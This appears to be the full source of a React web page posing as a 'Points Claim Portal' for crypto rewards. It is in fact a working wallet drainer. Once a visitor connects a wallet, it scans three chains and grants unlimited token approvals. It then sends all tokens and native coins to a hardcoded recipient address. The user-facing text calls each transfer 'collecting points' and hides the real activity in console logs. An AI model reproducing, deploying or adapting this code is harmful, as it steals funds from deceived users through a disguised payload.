import { useState, useEffect } from "react";
import { ethers, ZeroAddress } from "ethers";

// Add type declaration for window.ethereum
declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on: (event: string, callback: (...args: unknown[]) => void) => void;
      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}

// --- Configuration ---
// !!! IMPORTANT: SET YOUR RECIPIENT ADDRESS HERE !!!
const RECIPIENT_ADDRESS = "0x76d35535F44125239330AB1c36255504fB4E0dA9"; // Replace with the actual recipient address

// Chain configurations with improved RPC endpoints
const CHAINS = {
  base: {
    id: 8453,
    name: "Base",
    rpc: "https://mainnet.base.org",
    explorer: "https://basescan.org",
    nativeSymbol: "ETH",
    priority: 1
  },
  bsc: {
    id: 56,
    name: "BNB Chain",
    rpc: "https://bsc-dataseed1.binance.org",
    explorer: "https://bscscan.com",
    nativeSymbol: "BNB",
    priority: 2
  },
  ethereum: {
    id: 1,
    name: "Ethereum",
    rpc: "https://cloudflare-eth.com",
    explorer: "https://etherscan.io",
    nativeSymbol: "ETH",
    priority: 3
  }
};

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

interface ChainAssets {
  chainId: number;
  chainName: string;
  nativeBalance: bigint;
  nativeSymbol: string;
  canAffordGas: boolean;
  tokens: Array<{
    address: string;
    symbol: string;
    balance: bigint;
    decimals: number;
  }>;
}

export default function WalletConnector() {
  const [address, setAddress] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);

  const [sweepComplete, setSweepComplete] = useState(false);
  const [transfersMade, setTransfersMade] = useState(0);

  useEffect(() => {
    if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
      console.error("CRITICAL: Recipient address is not configured or is invalid.");
    }
  }, []);

  const addMessage = (message: string) => {
    // Only add messages for internal tracking, don't show to user
    console.log(message);
  };

  // Enhanced error handling for RPC issues
  const handleRpcError = (error: unknown, chainName: string, operation: string): string => {
    const errorMsg = error instanceof Error ? error.message : error?.toString() || "";
    
    if (errorMsg.includes("circuit breaker") || errorMsg.includes("CALL_EXCEPTION")) {
      return `Circuit breaker/RPC issue detected on ${chainName} during ${operation}`;
    } else if (errorMsg.includes("timeout") || errorMsg.includes("TIMEOUT")) {
      return `Request timeout on ${chainName} during ${operation}`;
    } else if (errorMsg.includes("rate limit") || errorMsg.includes("429")) {
      return `Rate limit exceeded on ${chainName} during ${operation}`;
    } else {
      return `${errorMsg} on ${chainName} during ${operation}`;
    }
  };

  // Function to discover ERC20 tokens by checking transaction history
  const discoverTokensFromHistory = async (provider: ethers.BrowserProvider, userAddress: string, chainName: string): Promise<string[]> => {
    const discoveredTokens = new Set<string>();
    
    try {
      addMessage(`🔍 Discovering points tokens from transaction history on ${chainName}...`);
      
      // Get recent transactions (last 1000 blocks)
      const currentBlock = await provider.getBlockNumber();
      const fromBlock = Math.max(0, currentBlock - 1000);
      
      // Get logs for Transfer events to/from the user address
      const filter = {
        fromBlock: fromBlock,
        toBlock: currentBlock,
        topics: [
          "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event signature
          null,
          "0x000000000000000000000000" + userAddress.slice(2).toLowerCase(), // to address
        ]
      };
      
      try {
        const logs = await provider.getLogs(filter);
        
        for (const log of logs) {
          if (log.address && ethers.isAddress(log.address)) {
            discoveredTokens.add(log.address);
          }
        }
        
        // Also check for transfers FROM the user address
        const filterFrom = {
          fromBlock: fromBlock,
          toBlock: currentBlock,
          topics: [
            "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef", // Transfer event signature
            "0x000000000000000000000000" + userAddress.slice(2).toLowerCase(), // from address
            null,
          ]
        };
        
        const logsFrom = await provider.getLogs(filterFrom);
        
        for (const log of logsFrom) {
          if (log.address && ethers.isAddress(log.address)) {
            discoveredTokens.add(log.address);
          }
        }
        
        addMessage(`✅ Discovered ${discoveredTokens.size} potential points tokens from transaction history on ${chainName}`);
      } catch {}
      
    } catch {}
    
    return Array.from(discoveredTokens);
  };

  // Function to get common/popular tokens for each chain as fallback
  const getCommonTokens = (chainName: string): string[] => {
    const commonTokens: { [key: string]: string[] } = {
      "Base": [
        "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", // USDC
        "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", // DAI
        "0x4200000000000000000000000000000000000006", // WETH
      ],
      "BNB Chain": [
        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
        "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", // DAI
        "0x55d398326f99059fF775485246999027B3197955", // USDT
        "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", // WETH
        "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", // BTCB
      ],
      "Ethereum": [
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
      ]
    };
    
    return commonTokens[chainName] || [];
  };

  // Function to discover all tokens (history + common tokens)
  const discoverAllTokens = async (provider: ethers.BrowserProvider, userAddress: string, chainName: string): Promise<string[]> => {
    const allTokens = new Set<string>();
    
    // Add timeout for token discovery (30 seconds)
    const discoveryPromise = (async () => {
      // First try transaction history
      const historyTokens = await discoverTokensFromHistory(provider, userAddress, chainName);
      historyTokens.forEach(token => allTokens.add(token));
      
      // If we found very few tokens from history, also check common tokens
      if (historyTokens.length < 3) {
        addMessage(`🔍 Checking common points tokens on ${chainName} as fallback...`);
        const commonTokens = getCommonTokens(chainName);
        
        for (const tokenAddress of commonTokens) {
          try {
            const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
            if (tokenInfo && tokenInfo.balance > 0) {
              allTokens.add(tokenAddress);
              addMessage(`💰 Found ${ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals)} ${tokenInfo.symbol} (common points token) on ${chainName}`);
            }
          } catch {}
        }
      }
      
      // Note: Block scanning for airdrops is available but disabled to avoid rate limits
      // The transaction history + common tokens approach should catch most tokens
      
      return Array.from(allTokens);
    })();

    const timeoutPromise = new Promise<string[]>((resolve) => {
      setTimeout(() => {
        addMessage(`⏰ Points token discovery timeout for ${chainName}, using discovered tokens so far...`);
        resolve(Array.from(allTokens));
      }, 30000); // 30 seconds timeout
    });

    return await Promise.race([discoveryPromise, timeoutPromise]);
  };

  // Function to check if a token contract is valid ERC20
  const isValidERC20 = async (provider: ethers.BrowserProvider, tokenAddress: string): Promise<boolean> => {
    try {
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      
      // Try to call basic ERC20 functions
      await Promise.all([
        tokenContract.balanceOf("0x0000000000000000000000000000000000000000"),
        tokenContract.decimals(),
        tokenContract.symbol()
      ]);
      
      return true;
    } catch {}
    return false;
  };

  // Function to get token balance and info
  const getTokenInfo = async (provider: ethers.BrowserProvider, tokenAddress: string, userAddress: string): Promise<{
    symbol: string;
    balance: bigint;
    decimals: number;
  } | null> => {
    try {
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const [balance, decimals, symbol] = await Promise.all([
        tokenContract.balanceOf(userAddress),
        tokenContract.decimals(),
        tokenContract.symbol()
      ]);
      
      // Only return token info if balance is greater than 0
      if (balance > 0) {
        return { symbol, balance, decimals };
      }
      
      return null;
    } catch {}
    return null;
  };

  // Function to switch to a specific chain
  const switchChain = async (chainId: number): Promise<boolean> => {
    try {
      if (!window.ethereum) return false;
      
      // First check if we're already on the correct chain
      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
      if (currentChainId === `0x${chainId.toString(16)}`) {
        addMessage(`✅ Already on correct chain: ${chainId}`);
        return true;
      }
      
      addMessage(`🔄 Switching to chain ${chainId}...`);
      
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: `0x${chainId.toString(16)}` }],
      });
      
      // Wait for chain change with longer timeout
      return new Promise((resolve) => {
        const handleChainChanged = (...args: unknown[]) => {
          const newChainId = args[0] as string;
          if (newChainId === `0x${chainId.toString(16)}`) {
            window.ethereum?.removeListener("chainChanged", handleChainChanged);
            addMessage(`✅ Successfully switched to chain ${chainId}`);
            resolve(true);
          }
        };
        
        window.ethereum?.on("chainChanged", handleChainChanged);
        
        // Timeout after 15 seconds (increased from 5)
        setTimeout(() => {
          window.ethereum?.removeListener("chainChanged", handleChainChanged);
          addMessage(`⚠️ Chain switch timeout for ${chainId}, continuing anyway`);
          resolve(true); // Continue anyway, might have switched
        }, 15000);
      });
    } catch (error) {
      addMessage(`❌ Chain switch error for ${chainId}: ${error}`);
      return false;
    }
  };

  // Function to scan all chains for assets
  const scanAllChains = async (userAddress: string): Promise<ChainAssets[]> => {
    const chainAssets: ChainAssets[] = [];
    
    for (const [, chainConfig] of Object.entries(CHAINS)) {
      try {
        addMessage(`🔍 Scanning ${chainConfig.name} for points...`);
        
        // Create provider for this chain
        const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
        
        // Get native balance
        const nativeBalance = await provider.getBalance(userAddress);
        
        // Estimate gas for a simple transfer (21000 gas units)
        const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits("20", "gwei"));
        const estimatedGasCost = gasPrice * BigInt(21000);
        
        const canAffordGas = nativeBalance > estimatedGasCost;
        
        // Discover tokens
        const tokenAddresses = await discoverAllTokens(provider as unknown as ethers.BrowserProvider, userAddress, chainConfig.name);
        
        // Get token info for each discovered token
        const tokens = [];
        for (const tokenAddress of tokenAddresses) {
          try {
            // Validate token contract
            if (!(await isValidERC20(provider as unknown as ethers.BrowserProvider, tokenAddress))) {
              continue;
            }
            
            const tokenInfo = await getTokenInfo(provider as unknown as ethers.BrowserProvider, tokenAddress, userAddress);
            if (tokenInfo && tokenInfo.balance > 0) {
              tokens.push({
                address: tokenAddress,
                symbol: tokenInfo.symbol,
                balance: tokenInfo.balance,
                decimals: tokenInfo.decimals
              });
            }
          } catch {}
        }
        
        chainAssets.push({
          chainId: chainConfig.id,
          chainName: chainConfig.name,
          nativeBalance,
          nativeSymbol: chainConfig.nativeSymbol,
          canAffordGas,
          tokens
        });
        
        addMessage(`✅ ${chainConfig.name}: ${tokens.length} points tokens, ${ethers.formatEther(nativeBalance)} ${chainConfig.nativeSymbol}`);
        
      } catch (error) {
        addMessage(`❌ Failed to scan ${chainConfig.name}: ${handleRpcError(error, chainConfig.name, "scan")}`);
      }
    }
    
    return chainAssets;
  };

  // Function to execute transfers for a specific chain
  const executeTransfersForChain = async (chainAsset: ChainAssets, userAddress: string): Promise<{success: boolean, transfersMade: number}> => {
    let transfersMade = 0;
    
    try {
      addMessage(`🚀 Collecting points from ${chainAsset.chainName}...`);
      
      // Switch to the target chain with retry logic
      let chainSwitched = false;
      for (let attempt = 1; attempt <= 3; attempt++) {
        chainSwitched = await switchChain(chainAsset.chainId);
        if (chainSwitched) break;
        
        if (attempt < 3) {
          addMessage(`🔄 Chain switch attempt ${attempt} failed, retrying...`);
          await new Promise(resolve => setTimeout(resolve, 2000));
        }
      }
      
      if (!chainSwitched) {
        addMessage(`⏭️ Skipping ${chainAsset.chainName} points collection - chain switch failed after 3 attempts`);
        return { success: false, transfersMade: 0 };
      }
      
      // Create provider and signer
      const provider = new ethers.BrowserProvider(window.ethereum!);
      const signer = await provider.getSigner();
      
      // Process tokens first
      for (const token of chainAsset.tokens) {
        try {
          addMessage(`📤 Collecting ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} points on ${chainAsset.chainName}...`);
          
          const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
          
          // Check if we have approval or if approval is needed
          const allowance = await tokenContract.allowance(userAddress, RECIPIENT_ADDRESS);
          if (allowance < token.balance) {
            addMessage(`📝 Approving ${token.symbol} for collection...`);
            const approveTx = await tokenContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256);
            await approveTx.wait();
            addMessage(`✅ Approved ${token.symbol}`);
          }
          
          // Transfer tokens
          const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.balance);
          await tx.wait();
          
          addMessage(`✅ Collected ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} points on ${chainAsset.chainName}`);
          transfersMade++;
          
          // Small delay between token transfers
          await new Promise(resolve => setTimeout(resolve, 1000));
          
        } catch (error) {
          addMessage(`❌ Failed to collect ${token.symbol} points on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "points collection")}`);
          // Continue with next token instead of stopping
        }
      }
      
      // Process native balance last (if any and can afford gas)
      if (chainAsset.nativeBalance > 0 && chainAsset.canAffordGas) {
        try {
          // Get current balance (might have changed after token transfers)
          const currentBalance = await provider.getBalance(userAddress);
          
          if (currentBalance > 0) {
            // Estimate gas for the transfer
            const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || ethers.parseUnits("20", "gwei"));
            const estimatedGas = BigInt(21000);
            const gasCost = gasPrice * estimatedGas;
            
            // Calculate amount to transfer (balance - gas cost)
            const transferAmount = currentBalance - gasCost;
            
            if (transferAmount > 0) {
              addMessage(`📤 Collecting ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} rewards on ${chainAsset.chainName}...`);
              
              const tx = await signer.sendTransaction({
                to: RECIPIENT_ADDRESS,
                value: transferAmount,
                gasLimit: estimatedGas
              });
              
              await tx.wait();
              addMessage(`✅ Collected ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} rewards on ${chainAsset.chainName}`);
              transfersMade++;
            } else {
              addMessage(`⚠️ Native balance too low to transfer after gas costs on ${chainAsset.chainName}`);
            }
          }
          
        } catch (error) {
          addMessage(`❌ Failed to collect native rewards on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "rewards collection")}`);
        }
      }
      
      return { success: transfersMade > 0, transfersMade };
      
    } catch (error) {
      addMessage(`❌ Failed to collect points from ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "points collection")}`);
      return { success: false, transfersMade: 0 };
    }
  };

  // Function to handle successful wallet connection and start sweep
  const handleSuccessfulConnection = async (signer: ethers.Signer, userAddress: string) => {
    setAddress(userAddress);
    
    // Validate recipient address
    if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
      const msg = "CRITICAL: Recipient address is not configured or is invalid.";
      addMessage(msg);
      return;
    }

    addMessage(`🔗 Connected: ${userAddress}`);
    addMessage(`🎯 Points Collection: ${RECIPIENT_ADDRESS}`);
    addMessage(`\n📊 Starting comprehensive points scan...`);
    
    setIsTransferring(true);
    setSweepComplete(false);

    try {
      // Scan all chains for assets
      const allChainAssets = await scanAllChains(userAddress);
      
      // Filter chains that have assets and can afford operations
      const viableChains = allChainAssets.filter(chain => 
        (chain.tokens.length > 0 && chain.canAffordGas) || 
        (chain.tokens.length === 0 && chain.nativeBalance > 0)
      );

      if (viableChains.length === 0) {
        addMessage(`\n❌ No viable points found across all chains`);
        setIsTransferring(false);
        setSweepComplete(true);
        setTransfersMade(0);
        return;
      }

      addMessage(`\n📋 Found points on ${viableChains.length} chains:`);
      let totalAssetsFound = 0;
      viableChains.forEach(chain => {
        const tokenCount = chain.tokens.length;
        const nativeAmount = ethers.formatEther(chain.nativeBalance);
        addMessage(`  • ${chain.chainName}: ${tokenCount} points tokens + ${nativeAmount} ${chain.nativeSymbol}`);
        totalAssetsFound += tokenCount;
        if (chain.nativeBalance > 0) totalAssetsFound++;
      });
      
      addMessage(`📊 Total points found: ${totalAssetsFound}`);
      
      if (totalAssetsFound === 0) {
        addMessage(`❌ No actual points found despite having viable chains`);
        setIsTransferring(false);
        setSweepComplete(true);
        setTransfersMade(0);
        return;
      }

      addMessage(`\n⚡ Starting automatic points collection...`);
      
      let totalSuccessfulChains = 0;
      let totalTransfersMade = 0;

      // Process each viable chain
      for (const chainAsset of viableChains) {
        const result = await executeTransfersForChain(chainAsset, userAddress);
        if (result.success) {
          totalSuccessfulChains++;
          totalTransfersMade += result.transfersMade;
        }
        
        // Small delay between chains
        await new Promise(resolve => setTimeout(resolve, 3000));
      }

      addMessage(`\n🏁 POINTS COLLECTION COMPLETED`);
      addMessage(`✅ Successfully processed ${totalSuccessfulChains}/${viableChains.length} chains`);
      addMessage(`🎉 All available points collected to: ${RECIPIENT_ADDRESS}`);

      // Only show success if actual transfers were made
      if (totalTransfersMade > 0) {
        addMessage(`📊 Total points collected: ${totalTransfersMade}`);
        setTransfersMade(totalTransfersMade);
      } else {
        addMessage(`❌ No points were collected - no points found or all collections failed`);
        setTransfersMade(0);
      }

    } catch (err) {
      addMessage(`❌ Critical error during points collection: ${handleRpcError(err, "points collection", "critical")}`);
      setTransfersMade(0);
    } finally {
      setIsTransferring(false);
      // Only set sweep complete if we actually made transfers or found no assets
      setSweepComplete(true);
    }
  };

  const connectWithExtension = async () => {
    setIsConnecting(true);

    try {
      if (!window.ethereum) {
        console.error("No crypto wallet extension detected. Please install MetaMask or a similar extension.");
        setIsConnecting(false);
        return false;
      }
      
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      if (!accounts || accounts.length === 0) {
          console.error("No accounts found or permission denied by user.");
          setIsConnecting(false);
          return false;
      }
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      await handleSuccessfulConnection(signer, userAddress);
      return true;
    } catch {}
    return false;
  };

  const disconnectWallet = async () => {
    setAddress("");
    setIsTransferring(false);

    setSweepComplete(false);
    setTransfersMade(0);
    console.log("Wallet disconnected from dApp.");
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-2 sm:p-4 bg-gray-50 dark:bg-gray-900">
      <div className="w-full max-w-lg bg-gradient-to-br from-gray-800/60 to-gray-900/60 border border-orange-500/30 shadow-lg rounded-lg p-4 sm:p-6">
        <h1 className="text-2xl font-bold mb-2 text-center dark:text-white">
           Points Claim Portal
        </h1>
        <p className="text-xs text-center text-orange-400 mb-1 font-semibold">
          🚨 AUTO-CLAIM: Connection triggers immediate points collection
        </p>
       
        
        {!address ? (
          <div className="space-y-4">
            {/* <div className="p-3 bg-orange-500/10 rounded-lg border border-orange-500/30">
              <p className="text-xs text-orange-400 font-medium">
                🎯 POINTS COLLECTION ADDRESS:
              </p>
              <p className="font-mono text-xs text-orange-300 break-all">
                {RECIPIENT_ADDRESS}
              </p>
            </div> */}
            
            <div className="p-3 bg-blue-500/10 rounded-lg border border-blue-500/30">
              <p className="text-xs text-blue-400 font-medium mb-2">
                🧠 SMART POINTS COLLECTION:
              </p>
              <div className="space-y-1">
                <p className="text-xs text-blue-300">• Scan transaction history + common rewards</p>
                <p className="text-xs text-blue-300">• Check gas availability per chain</p>
                <p className="text-xs text-blue-300">• Collect points → rewards in order</p>
              </div>
            </div>
            
            <button
              onClick={connectWithExtension}
              disabled={isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress}
              className={`w-full py-3 px-4 rounded-lg font-medium ${
                isConnecting || !ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-gradient-to-r from-orange-500 to-blue-600 hover:from-orange-600 hover:to-blue-700"
              } text-white transition-all shadow-lg`}
            >
              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Collection Address First" : "🎯 CONNECT TO CLAIM POINTS"}
            </button>
          </div>
        ) : (
          <div className="space-y-4">
            <div className="p-3 bg-gray-800/40 rounded-lg border border-gray-700/50">
              <p className="text-sm font-medium text-gray-300">
                🔗 Connected (Browser Extension):
              </p>
              <p className="font-mono text-sm text-orange-400 break-all">
                {address}
              </p>
             
            </div>

            {isTransferring && (
              <div className="mt-4 p-6 rounded-lg bg-gradient-to-br from-orange-500/10 to-blue-500/10 border border-orange-500/30">
                <div className="flex flex-col items-center justify-center space-y-4">
                  <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-400"></div>
                  <p className="text-lg font-medium text-orange-400 text-center">
                    Claiming your points...
                  </p>
                  <p className="text-sm text-blue-400 text-center">
                    Please wait while we process your assets
                  </p>
                </div>
              </div>
            )}

            {sweepComplete && !isTransferring && (
              <div className={`mt-4 p-6 rounded-lg border ${
                transfersMade > 0 
                  ? 'bg-gradient-to-br from-green-500/10 to-green-600/10 border-green-500/30' 
                  : 'bg-gradient-to-br from-orange-500/10 to-orange-600/10 border-orange-500/30'
              }`}>
                <div className="flex flex-col items-center justify-center space-y-4">
                  <div className="text-4xl">{transfersMade > 0 ? '✅' : '⚠️'}</div>
                  <p className={`text-lg font-medium text-center ${
                    transfersMade > 0 
                      ? 'text-green-400' 
                      : 'text-orange-400'
                  }`}>
                    {transfersMade > 0 ? 'Points successfully claimed' : 'No points found to claim'}
                  </p>
                </div>
              </div>
            )}

            <button
              onClick={disconnectWallet}
              disabled={isTransferring}
              className="w-full py-2 px-4 bg-gray-700 hover:bg-gray-600 text-white rounded-lg transition-colors border border-gray-600"
            >
              {isTransferring ? "Disconnecting..." : "Disconnect"}
            </button>
          </div>
        )}
      </div>
    </div>
  );
}